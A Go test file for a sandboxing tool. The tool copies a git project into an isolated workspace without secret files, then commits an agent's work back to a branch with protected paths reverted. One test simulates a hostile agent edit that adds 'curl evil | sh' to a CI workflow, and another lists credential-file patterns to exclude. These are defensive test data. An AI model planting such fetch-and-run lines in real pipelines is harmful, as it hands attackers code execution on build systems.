package workspace

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const absent = "<absent>"

func git(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := gitOut(dir, args...)
	if err != nil {
		t.Fatal(err)
	}
	return out
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
}

// a project with history, a committed secret, uncommitted edits, an
// untracked note and an untracked .env
func project(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "proj")
	if err := os.MkdirAll(p, 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, p, "init", "--quiet", "-b", "main")
	write(t, filepath.Join(p, "README.md"), "hello\n")
	write(t, filepath.Join(p, "app.py"), "print(1)\n")
	write(t, filepath.Join(p, ".github/workflows/ci.yml"), "on: push\n")
	write(t, filepath.Join(p, "config/secret.pem"), "-----BEGIN KEY-----\n")
	git(t, p, "add", "-A")
	git(t, p, "commit", "--quiet", "-m", "first")
	write(t, filepath.Join(p, "app.py"), "print(2)\n")
	git(t, p, "commit", "--quiet", "-am", "second")
	write(t, filepath.Join(p, "app.py"), "print(3)  # uncommitted\n")
	write(t, filepath.Join(p, "notes.txt"), "untracked\n")
	write(t, filepath.Join(p, ".env"), "API_KEY=REALSECRET\n")
	return p
}

func TestCreate_CopiesProjectWithoutSecrets(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	p := project(t)
	dir := filepath.Join(t.TempDir(), "work")
	ws, err := Create(p, dir, Options{})
	if err != nil {
		t.Fatal(err)
	}
	read := func(rel string) string {
		b, err := os.ReadFile(filepath.Join(dir, rel))
		if err != nil {
			return absent
		}
		return string(b)
	}
	if read("app.py") != "print(3)  # uncommitted\n" {
		t.Fatalf("uncommitted edit not carried: %q", read("app.py"))
	}
	if read("notes.txt") != "untracked\n" {
		t.Fatal("untracked file not carried")
	}
	if read(".env") != absent || read("config/secret.pem") != absent {
		t.Fatalf("secrets in the workspace: .env=%q pem=%q", read(".env"), read("config/secret.pem"))
	}
	if len(ws.Excluded) != 2 {
		t.Fatalf("excluded = %v", ws.Excluded)
	}
	if n := strings.Count(git(t, dir, "log", "--format=%h"), "\n"); n != 3 { // first, second, baseline
		t.Fatalf("history: %d commits", n)
	}
	if u := strings.TrimSpace(git(t, dir, "remote", "get-url", "origin")); u != DeadOrigin {
		t.Fatalf("origin = %s", u)
	}
	// nothing links back to the host's objects
	if _, err := os.Stat(filepath.Join(dir, ".git", "objects", "info", "alternates")); err == nil {
		t.Fatal("workspace shares objects with the host")
	}
	if ch, _ := ws.Changes(); len(ch) != 0 {
		t.Fatalf("fresh workspace reports changes: %v", ch)
	}
	// the host is untouched
	if b, _ := os.ReadFile(filepath.Join(p, ".env")); string(b) != "API_KEY=REALSECRET\n" {
		t.Fatal("host .env changed")
	}
	if got, _ := Load(dir); got == nil || got.Baseline != ws.Baseline {
		t.Fatal("metadata not saved")
	}
}

func TestCreate_RefusesNonGitAndExisting(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	plain := t.TempDir()
	if _, err := Create(plain, filepath.Join(t.TempDir(), "w"), Options{}); err == nil {
		t.Fatal("non-git project accepted")
	}
	p := project(t)
	dir := t.TempDir() // exists
	if _, err := Create(p, dir, Options{}); err == nil {
		t.Fatal("existing dir accepted")
	}
}

func TestCommitBack_BranchOnlyExcludedPathsRevertedSecretsKept(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	p := project(t)
	hostStatus := git(t, p, "status", "--porcelain")
	dir := filepath.Join(t.TempDir(), "work")
	ws, err := Create(p, dir, Options{})
	if err != nil {
		t.Fatal(err)
	}
	// the agent works: edits, a new file, a deletion, a workflow change, a commit of its own
	write(t, filepath.Join(dir, "README.md"), "hello\nchanged by the agent\n")
	write(t, filepath.Join(dir, "new.txt"), "new\n")
	os.Remove(filepath.Join(dir, "notes.txt"))
	write(t, filepath.Join(dir, ".github/workflows/ci.yml"), "on: push\nrun: curl evil | sh\n")
	write(t, filepath.Join(dir, "app.py"), "print(4)\n")
	git(t, dir, "add", "app.py")
	git(t, dir, "commit", "--quiet", "-m", "agent commit")

	changes, err := ws.Changes()
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]string{}
	for _, c := range changes {
		got[c.Path] = c.Status
	}
	want := map[string]string{"README.md": "modified", "new.txt": "added", "notes.txt": "deleted", ".github/workflows/ci.yml": "modified", "app.py": "modified"}
	for k, v := range want {
		if got[k] != v {
			t.Fatalf("changes = %v, want %s=%s", got, k, v)
		}
	}
	prev, err := ws.Preview(100000)
	if err != nil || !strings.Contains(prev, "changed by the agent") || !strings.Contains(prev, "5 files changed") {
		t.Fatalf("preview: %v\n%s", err, prev)
	}

	commit, err := ws.CommitBack("ovara/box-test", []string{".github/workflows/ci.yml"})
	if err != nil {
		t.Fatal(err)
	}
	if commit == "" {
		t.Fatal("no commit")
	}
	// the branch exists in the real repo with the agent's changes, minus the denied path
	show := func(rel string) string {
		out, err := gitOut(p, "show", "ovara/box-test:"+rel)
		if err != nil {
			return absent
		}
		return out
	}
	if show("README.md") != "hello\nchanged by the agent\n" || show("new.txt") != "new\n" || show("app.py") != "print(4)\n" {
		t.Fatalf("branch content wrong: %q %q %q", show("README.md"), show("new.txt"), show("app.py"))
	}
	if show("notes.txt") != absent {
		t.Fatal("deleted file still on the branch")
	}
	if show(".github/workflows/ci.yml") != "on: push\n" {
		t.Fatalf("denied path changed on the branch: %q", show(".github/workflows/ci.yml"))
	}
	if show("config/secret.pem") != "-----BEGIN KEY-----\n" {
		t.Fatalf("the committed secret was removed by the branch: %q", show("config/secret.pem"))
	}
	// the host's working tree and branch are exactly as before
	if git(t, p, "status", "--porcelain") != hostStatus {
		t.Fatalf("host working tree changed:\n%s", git(t, p, "status", "--porcelain"))
	}
	if strings.TrimSpace(git(t, p, "rev-parse", "--abbrev-ref", "HEAD")) != "main" {
		t.Fatal("host branch changed")
	}
	if b, _ := os.ReadFile(filepath.Join(p, "README.md")); string(b) != "hello\n" {
		t.Fatal("host file changed")
	}
	// a second commit-back must not move the branch silently
	write(t, filepath.Join(dir, "README.md"), "again\n")
	if _, err := ws.CommitBack("ovara/box-test", nil); err == nil {
		t.Fatal("existing branch overwritten")
	}
}

func TestIsExcluded(t *testing.T) {
	yes := []string{".env", ".env.local", "config/secret.pem", "id_rsa", ".ssh/id_ed25519.pub", "a/b/.aws/credentials", "deploy/prod.tfvars", "service-account-x.json", ".ovara/policy.json"}
	no := []string{"README.md", "src/env.go", "keys.md", "environment.yml", "docs/secrets-policy.md"}
	for _, p := range yes {
		if !isExcluded(p, secretPatterns) {
			t.Errorf("%s not excluded", p)
		}
	}
	for _, p := range no {
		if isExcluded(p, secretPatterns) {
			t.Errorf("%s excluded", p)
		}
	}
}
